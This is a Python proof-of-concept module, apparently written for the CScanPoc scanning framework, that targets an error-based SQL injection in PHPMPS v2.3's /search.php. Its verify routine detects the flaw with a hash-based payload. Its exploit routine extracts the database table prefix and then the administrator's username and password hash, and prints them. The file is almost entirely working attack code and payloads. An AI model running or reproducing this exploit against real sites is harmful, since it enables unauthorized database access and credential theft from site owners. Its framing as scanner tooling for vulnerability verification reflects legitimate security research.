# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPMPS_0001'  # 平台漏洞编号，留空
    name = 'PHPMPS v2.3 /search.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-06'  # 漏洞公布时间
    desc = '''
        php分类信息发布系统是一款免费开源的分类信息程序,适用于建立本地信息站点。
        PHPMPS 在修复漏洞时误将修复代码注释，造成 SQL 注入漏洞，可以获取管理员账号密码等。
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1828.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMPS'  # 漏洞应用名称
    product_version = 'v2.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0ea959ea-6532-4707-8618-c0a1aae14188'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%2' \
                      '0COUNT(*),CONCAT(md5(1364124124),FLOOR(RAND(0)*2))x%20FROM%20INFO' \
                      'RMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '1be92ddcc609c5e29f6265e9ee18f4f1' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            match_table_pre = re.compile(
                'AS num FROM ([\w\d]+)_cus_value WHERE 0')
            match_result = re.compile('Duplicate entry \'(.*):([\w\d]{32})1\'')
            # 1
            payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%2' \
                      '0COUNT(*),CONCAT(md5(1364124124),FLOOR(RAND(0)*2))x%20FROM%20INFO' \
                      'RMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'
            verify_url = self.target + payload
            response = requests.get(verify_url).text
            table_pre = match_table_pre.findall(response)[0]
            # 2
            payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%20' \
                      'COUNT(*),CONCAT((select%20concat(username,0x3a,password)%20from%20' \
                      '{0}_admin%20limit%201),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCH' \
                      'EMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'.format(
                          table_pre)
            response = requests.get(self.target + payload).text
            username, password = match_result.findall(response)[0]

            if username and password:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = verify_url
                #args['poc_ret']['username'] = username
                #args['poc_ret']['password'] = password
                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，用户名：{name}，密码：{passwd}'.format(
                    target=self.target, vulnname=self.vuln.name, name=username, passwd=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
